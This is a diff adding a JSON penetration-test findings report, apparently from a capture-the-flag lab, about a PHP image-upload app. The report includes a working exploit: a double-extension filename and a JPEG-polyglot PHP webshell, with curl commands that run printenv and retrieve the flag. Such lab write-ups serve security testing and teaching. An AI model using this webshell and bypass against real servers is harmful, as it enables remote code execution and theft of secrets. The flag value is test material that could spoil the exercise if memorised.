@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:29:21.220806+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "b948022e-76a1-4506-b2fb-9da1aa27daa7",
+      "timestamp": "2026-04-12T21:29:21.220684+00:00",
+      "title": "File Upload Bypass via Double Extension + PHP RCE + Environment Variable Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:44925",
+      "description": "The image upload validation checks for '.jpg' anywhere in the filename (not anchored to the end), allowing an attacker to upload a file named 'shell.jpg.php'. Apache's mod_php processes this as PHP because the final extension is .php. The upload validation also requires valid JPEG magic bytes/structure, which was bypassed by prepending a valid JPEG header to the PHP webshell payload. This combination achieves Remote Code Execution (RCE) as www-data, enabling full server compromise including environment variable leakage.",
+      "evidence": "1. Upload with filename 'shell.jpg.php' + JPEG magic bytes passes both extension (.jpg substring match) and structure checks.\n2. File stored at upload/shell.jpg.php and executed as PHP by Apache.\n3. Webshell output confirmed: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n4. Environment variables exposed via printenv:\n   FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}\n\nExploit steps:\n- Created JPEG polyglot PHP webshell: bytes([0xFF,0xD8,...JPEG header...]) + b'<?php system($_GET[\"cmd\"]); ?>'\n- Uploaded as filename='shell.jpg.php' (passes .jpg substring check)\n- Accessed http://172.17.0.1:44925/upload/shell.jpg.php?cmd=printenv\n- FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}",
+      "tool_used": "curl + manual exploit",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -s -X POST http://172.17.0.1:44925/index.php -F 'userfile=@shell.jpg;filename=shell.jpg.php;type=image/jpeg' -F 'submit=Upload Image' && curl -s 'http://172.17.0.1:44925/upload/shell.jpg.php?cmd=printenv'",
+        "expected": "FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "9a4d5727-a16e-45b0-bbb4-250d2c3d187c",
+      "timestamp": "2026-04-12T21:29:29.643883+00:00",
+      "title": "Image Upload App Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> UploadForm[\"Upload Form index.php\"]\n  UploadForm --> ValidationLogic[\"PHP Validation Logic\"]\n  ValidationLogic --> ExtCheck[\"Extension Check - substring .jpg\"]\n  ValidationLogic --> StructCheck[\"JPEG Structure Check\"]\n  ExtCheck -- \"BYPASS: shell.jpg.php\" --> UploadDir[\"upload/ Directory\"]\n  StructCheck -- \"BYPASS: JPEG polyglot\" --> UploadDir\n  UploadDir --> ApachePHP[\"Apache mod_php executes .php\"]\n  ApachePHP --> WebShell[\"PHP Webshell RCE\"]\n  WebShell --> EnvVars[\"Environment Variables\"]\n  EnvVars --> Flag[\"FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}\"]"
+    }
+  ]
+}
